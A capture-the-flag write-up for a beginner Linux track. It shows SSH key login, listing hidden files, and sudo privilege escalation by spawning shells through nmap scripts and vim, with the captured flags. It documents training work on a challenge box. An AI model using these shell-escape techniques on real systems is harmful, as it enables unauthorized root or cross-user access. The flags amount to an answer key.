# Beginner - Linux (by Viper)

## SSH Key

* **Track:** linux
* **Points:** 2

### Challenge

> You are given an SSH key to the kingdom, do you know how to use it?
> If you do, use it at beginner-linux.hfctf.ca with the user cerealkiller.
> Note: you are rarely given an SSH key during real world penetration  tests. However, it's really good to learn to use it for security.

### Solution

Download the ssh key.

    mv id_ed25519 ../.ssh/id_rsa  

    chmod 600 ~/.ssh/id_rsa
      

    ┌─[user@parrot]─[~/.ssh]
    └──╼ $ssh cerealkiller@beginner-linux.hfctf.ca
    Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1088-aws x86_64)

     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage

      System information as of Sun Oct 30 03:12:00 UTC 2022

      System load:  0.0               Processes:           165
      Usage of /:   71.1% of 7.68GB   Users logged in:     1
      Memory usage: 14%               IP address for ens5: 172.31.16.57
      Swap usage:   0%

     * Ubuntu Pro delivers the most comprehensive open source security and
       compliance features.

       https://ubuntu.com/aws/pro

    2 updates can be applied immediately.
    To see these additional updates run: apt list --upgradable

    New release '20.04.5 LTS' available.
    Run 'do-release-upgrade' to upgrade to it.


    *** System restart required ***
    Last login: Sun Oct 30 03:11:45 2022 from 207.253.195.22
    $ ls
    65	  PhiletPO	 holla	   test.lua
    Allo	  SHAWIGANG	 nmap	   test.nse
    Allo.txt  flag.txt	 nmap.old
    Phil	  flag.txt.save  nmap.sh
    $ cat flag.txt		
    HF-336b63e842390b1a44cb4eeb28f9d19e

### Flag

```
HF-336b63e842390b1a44cb4eeb28f9d19e
```

## Hidden File

* **Track:** linux
* **Points:** 3

### Challenge

> Get a shell as the user cerealkiller with the previous SSH key and look for a hidden file.
> Requirement: You need to have done the SSH Challenge first

### Solution

    $ ls -la
    total 5900
    drwxr-xr-x  9 cerealkiller cerealkiller    4096 Oct 30 03:13 .
    drwxr-xr-x 10 root         root            4096 Nov 11  2021 ..
    -rw-------  1 cerealkiller cerealkiller     242 Nov 20  2021 .Xauthority
    -rw-r--r--  1 root         root               0 Jun 14  2019 .bash_history
    -rw-r--r--  1 cerealkiller cerealkiller     220 Apr  4  2018 .bash_logout
    -rw-r--r--  1 cerealkiller cerealkiller    3771 Jun 21  2020 .bashrc
    drwx------  3 cerealkiller cerealkiller    4096 Nov 19  2021 .cache
    drwx------  4 cerealkiller cerealkiller    4096 Nov 20  2020 .config
    drwx------  4 cerealkiller cerealkiller    4096 Nov 20  2020 .gnupg
    drwxr-xr-x  2 root         root            4096 Oct 23 16:34 .hidden
    -rw-------  1 cerealkiller cerealkiller     257 Oct 30 01:33 .lesshst
    drwxrwxr-x  3 cerealkiller cerealkiller    4096 Nov 20  2021 .local
    -rw-r--r--  1 cerealkiller cerealkiller     807 Apr  4  2018 .profile
    -rw-------  1 cerealkiller cerealkiller      20 Oct 29 23:48 .python_history
    drwx------  2 cerealkiller cerealkiller    4096 Oct 30 02:13 .ssh
    -rw-------  1 cerealkiller cerealkiller   12288 Jun 20  2020 .swp
    drwxr-xr-x  2 cerealkiller cerealkiller    4096 Oct 30 03:08 .vim
    -rw-------  1 cerealkiller cerealkiller   11782 Oct 30 03:13 .viminfo
    -rw-rw-r--  1 cerealkiller cerealkiller       0 Oct 30 00:10 65
    -rw-rw-r--  1 cerealkiller cerealkiller       0 Oct 30 01:36 Allo
    -rw-rw-r--  1 cerealkiller cerealkiller       0 Oct 30 01:36 Allo.txt
    -rw-rw-r--  1 cerealkiller cerealkiller       0 Oct 30 01:36 Phil
    -rw-rw-r--  1 cerealkiller cerealkiller       0 Oct 30 01:36 PhiletPO
    -rw-rw-r--  1 cerealkiller cerealkiller       0 Oct 30 01:45 SHAWIGANG
    ----r-----  1 root         cerealkiller      36 Oct 23 16:29 flag.txt
    ----r-----  1 cerealkiller cerealkiller      71 Oct 30 01:16 flag.txt.save
    -rwxr-xr-x  1 cerealkiller cerealkiller 2961432 Oct 29 18:51 holla
    -rw-rw-r--  1 cerealkiller cerealkiller      24 Oct 29 18:50 nmap
    -rwxr-xr-x  1 cerealkiller cerealkiller 2961432 Oct 29 23:36 nmap.old
    -rw-rw-r--  1 cerealkiller cerealkiller      38 Oct 30 01:51 nmap.sh
    -rw-rw-r--  1 cerealkiller cerealkiller      19 Oct 29 22:23 test.lua
    -rwxrwxr-x  1 cerealkiller cerealkiller      22 Oct 30 01:15 test.nse
    $ cd .hidden
    $ ls -la
    total 12
    drwxr-xr-x 2 root         root         4096 Oct 23 16:34 .
    drwxr-xr-x 9 cerealkiller cerealkiller 4096 Oct 30 03:13 ..
    -r-------- 1 cerealkiller root           36 Oct 23 16:34 flag.txt
    $ cat flag.txt
    HF-c3ae06f70363066574dc6f52338df7f5

### Flag

```
HF-c3ae06f70363066574dc6f52338df7f5
```

## Nmap

* **Track:** linux
* **Points:** 7

### Challenge

> On the box, you are allowed to use nmap as another user. What can you do with these new privileges? Are you able to read the secret files from the user's home directory?
> Note: use the SSH key from the first Linux challenge to log into the box.

### Solution

    $ sudo -l
    Matching Defaults entries for cerealkiller on ip-172-31-16-57:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User cerealkiller may run the following commands on ip-172-31-16-57:
        (phantom) NOPASSWD: ALL
        (vimuser) NOPASSWD: /usr/bin/vim
        (nmapuser) NOPASSWD: /usr/bin/nmap
        (pathuser) NOPASSWD: /home/pathuser/pathuser.sh
    $ ls -l /usr/bin/nmap
    -rwxr-xr-x 1 root root 2961432 Apr 16  2018 /usr/bin/nmap



    call bash
    $ bash

    https://vk9-sec.com/nmap-privilege-escalation/
    https://atom.hackstreetboys.ph/linux-privilege-escalation-shell-escape-sequences/
    https://gtfobins.github.io/gtfobins/nmap/#sudo

    nancy=$(mktemp)
    echo 'os.execute("/bin/sh")' > $nancy
    echo $nancy = find the path
    chmod o+r /tmp/xxxxxx
    sudo -u nmapuser nmap --script=$nancy
    whoami
    cd /home/nmapuser
    cat flag.txt
    HF-661a224a12a754dd176b229f5de7ff4a

### Tool

* https://gtfobins.github.io/gtfobins/nmap/

### Flag

```
HF-661a224a12a754dd176b229f5de7ff4a
```

## Sudo

* **Track:** linux
* **Points:** 4

### Challenge

> The user cerealkiller has some sudo privileges. Learn to use sudo  to be able to read the flag in the user "phantom" home directory.
> Requirement: You need to have done the SSH Challenge first Recommendation: Read on sudo

### Solution

Using the same technique with nmap but with phantom user.  When it works it works...
    phantom@ip-172-31-16-57:/home/phantom$ HF-0f06d368868f3b63b99c6bbbb6b52628

### Tool

* https://gtfobins.github.io/gtfobins/nmap/

### Flag

```
HF-0f06d368868f3b63b99c6bbbb6b52628
```

## Vim

* **Track:** linux
* **Points:** 5

### Challenge

> Vim is a popular text editor for Linux, but there are a lot more  that you can do with it rather than just editing text.  Can you find out  what?
> You are allowed to run vim as another user, learn what you can do with that.

### Solution

    cerealkiller@ip-172-31-16-57:~$ sudo -u vimuser vim -c ':!/bin/sh'

    $ whoami
    vimuser
    $ ls
    65	  Baron     SHAWIGANG	   holla  nmap.old  test.nse
    Allo	  Phil	    flag.txt	   nancy  nmap.sh
    Allo.txt  PhiletPO  flag.txt.save  nmap   test.lua
    $ cd ..
    $ ls
    cerealkiller  oracle	phantom   ubuntu
    nmapuser      pathuser	ssm-user  vimuser
    $ cd vimuser
    $ ls
    flag.txt
    $ cat flag.txt
    HF-f898198629bb686f1dfc3d1ac8b13506

### Flag

```
HF-f898198629bb686f1dfc3d1ac8b13506
```
